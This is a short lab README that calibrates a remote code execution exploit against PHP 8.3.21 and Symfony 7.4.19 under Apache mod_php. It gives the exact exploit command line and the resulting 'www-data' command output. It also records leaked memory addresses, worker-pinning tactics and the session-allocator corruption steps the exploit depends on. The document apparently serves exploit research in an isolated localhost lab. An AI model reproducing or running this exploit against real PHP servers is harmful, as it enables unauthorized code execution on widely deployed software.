# PHP 8.3.21 / Symfony calibration

The requested Symfony `7.14.19` release does not exist. This lab therefore
uses Symfony `7.4.19`; the exact packages are pinned in `app/composer.lock`.

The validated target is the isolated native `linux/amd64` Apache/mod_php lab
published only on `127.0.0.1:9094`. It is not a universal PHP profile.

## Validated command

Run this on the lab host from `/root/php2shell-symfony-8321-lab`:

```sh
python3 calibration/agent_psfiles/exploit_generic.py \
  --url http://127.0.0.1:9094/index.php \
  --cmd id \
  --profile-json calibration/agent_psfiles/profile-calibrated-php-8.3.21-symfony.json \
  --memory-limit 8 \
  --workers 4 \
  --output-dir artifacts/php-8.3.21-symfony-proof
```

The command carrier is limited to 14 bytes in this calibration. The exploit
must run without unrelated concurrent requests. With four prefork workers it
holds three workers on verified keep-alive connections and preserves A/B
affinity on the fourth.

## Result

Complete mono-worker runs and a four-worker run returned the command output
directly in the terminal HTTP response:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The second preserved proof is under
`artifacts/agent-full-rce-shifta-20261025/run4-profile-id`. Its result records:

- PHP `8.3.21`, Apache `mod_php`, native amd64;
- Symfony `7.4.19` booted by the endpoint;
- `libphp.so` SHA-256
  `b359ebd17f6db814f85721a6c1c0245888413f42254638910207a4eb273a62c0`;
- `pDestructor=0x7b59ed1da5f0` and `libphp_base=0x7b59ecd49000` for this ASLR draw;
- complete HTTP status `200` with 54 command-output bytes;
- output SHA-256
  `6d99797c5e70f1676baffdaab9979d52aef4d97cb7c457054182abe6e4075c1e`.

The native four-worker proof used `apache_worker_count=4`,
`parked_worker_count=3`, and `worker_affinity=prefork-keepalive-fencing`.
After the terminal callback, the three parking connections were closed and the
pool returned to four live children. Use `./scripts/test-multiworker.sh id` to
produce a fresh machine-checkable receipt.

The PHP 8.3.21-specific allocator adjustments are documented in the calibrated
profile. In particular, phase 2 shifts `PS(mod_data)` by one bin-40 field and
phase 3 uses a dedicated bin-192 reference carrier at the stale
`PS(http_session_vars)` address.
